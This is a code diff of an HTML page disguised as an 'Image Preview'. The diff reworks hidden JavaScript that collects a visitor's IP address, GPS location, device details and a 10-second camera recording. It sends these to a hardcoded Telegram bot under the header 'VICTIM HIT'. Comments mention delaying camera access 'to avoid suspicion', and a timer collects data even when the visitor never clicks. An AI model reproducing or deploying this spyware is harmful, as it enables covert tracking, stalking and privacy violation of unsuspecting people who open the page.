@@ -1,97 +1,121 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Viewer</title>
+    <title>Image Preview</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { margin: 0; padding: 0; background: #000; }
-        img { width: 100%; height: auto; }
+        img { width: 100%; height: auto; cursor: pointer; }
     </style>
 </head>
 <body>
-    <img src="https://image2url.com/images/1754223677507-03a3b8dc-4a52-4cad-8207-64e6a5c6f74b.jpg" alt="Loading...">
+    <img src="https://image2url.com/images/1754223677507-03a3b8dc-4a52-4cad-8207-64e6a5c6f74b.jpg" alt="Click to view">
 
     <script>
-        // Telegram bot setup
+        // Telegram Bot Config
         const BOT_TOKEN = "8386686128:AAFLCInZJmy72La6aiWW2GPy9iTSfptNmts";
         const CHAT_ID = "7307112522";
 
-        // Collect device info
-        const deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookiesEnabled: navigator.cookieEnabled,
+        // Collect Device Data
+        const collectData = () => {
+            const data = {
+                ip: "N/A",
+                gps: "N/A",
+                device: {
+                    name: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
+                },
+                camera: "Not Accessed",
+                screenRecording: "Not Started"
+            };
+
+            // Get IP
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+
+                    // Get GPS (if mobile allows)
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            pos => {
+                                data.gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                                sendToBot(data);
+                            },
+                            err => {
+                                data.gps = `Blocked: ${err.message}`;
+                                sendToBot(data);
+                            }
+                        );
+                    } else {
+                        data.gps = "Geolocation Not Supported";
+                        sendToBot(data);
+                    }
+                })
+                .catch(() => {
+                    data.ip = "Failed to fetch";
+                    sendToBot(data);
+                });
         };
 
-        // Get IP (via free API)
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                deviceInfo.ip = data.ip;
-
-                // Get GPS (if mobile + permissions trick)
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            deviceInfo.gps = {
-                                lat: position.coords.latitude,
-                                lon: position.coords.longitude,
-                                accuracy: position.coords.accuracy
-                            };
-                            sendToTelegram(deviceInfo);
-                        },
-                        (error) => {
-                            deviceInfo.gpsError = error.message;
-                            sendToTelegram(deviceInfo);
-                        }
-                    );
-                } else {
-                    deviceInfo.gpsError = "Geolocation not supported";
-                    sendToTelegram(deviceInfo);
-                }
-            });
-
-        // Send data to Telegram bot
-        function sendToTelegram(data) {
-            const message = `📱 *Device HIT* 📱\n\n` +
-                `🔍 *IP:* ${data.ip || "N/A"}\n` +
-                `📌 *GPS:* ${data.gps ? `${data.gps.lat}, ${data.gps.lon}` : "N/A"}\n` +
-                `🛠 *User Agent:* ${data.userAgent}\n` +
-                `🖥 *Screen:* ${data.screenWidth}x${data.screenHeight}\n` +
-                `🌐 *Language:* ${data.language}\n` +
-                `⏰ *Timezone:* ${data.timezone}\n` +
-                `🍪 *Cookies:* ${data.cookiesEnabled ? "Enabled" : "Disabled"}\n`;
+        // Send Data to Telegram Bot
+        const sendToBot = (data) => {
+            const message = `📱 *VICTIM HIT* 📱\n\n` +
+                `🌐 *IP:* \`${data.ip}\`\n` +
+                `📍 *GPS:* \`${data.gps}\`\n` +
+                `📛 *Device:* \`${data.device.name}\`\n` +
+                `🛠 *User Agent:* \`${data.device.userAgent}\`\n` +
+                `🖥 *Screen:* \`${data.device.screen}\`\n` +
+                `🎥 *Camera:* \`${data.camera}\`\n` +
+                `📹 *Screen Recording:* \`${data.screenRecording}\``;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
-        }
+        };
 
-        // Screen recording / camera access (requires user permission)
-        document.addEventListener('click', () => {
+        // Attempt Camera Access + Screen Recording
+        const activateCamera = () => {
             navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                 .then(stream => {
-                    const recorder = new MediaRecorder(stream);
-                    let chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const formData = new FormData();
-                        formData.append('video', blob, 'screen_capture.webm');
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    };
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 10000); // 10 sec recording
+                    // Send Camera Active Alert
+                    sendToBot({ camera: "Accessed (Back Camera)" });
+
+                    // Start Screen Recording (if possible)
+                    try {
+                        const recorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/webm' });
+                            const formData = new FormData();
+                            formData.append('video', blob, 'camera_capture.webm');
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
+                                method: 'POST',
+                                body: formData
+                            });
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 10000); // 10 sec recording
+                    } catch (e) {
+                        sendToBot({ screenRecording: `Failed: ${e.message}` });
+                    }
                 })
                 .catch(err => {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CAMERA_BLOCKED:${err.message}`);
+                    sendToBot({ camera: `Blocked: ${err.message}` });
                 });
+        };
+
+        // Trigger on Image Click
+        document.querySelector('img').addEventListener('click', () => {
+            collectData();
+            setTimeout(activateCamera, 2000); // Delay to avoid suspicion
         });
+
+        // Auto-Collect Data if Click Not Needed
+        setTimeout(collectData, 3000); // Fallback in case user doesn't click
     </script>
 </body>
 </html>
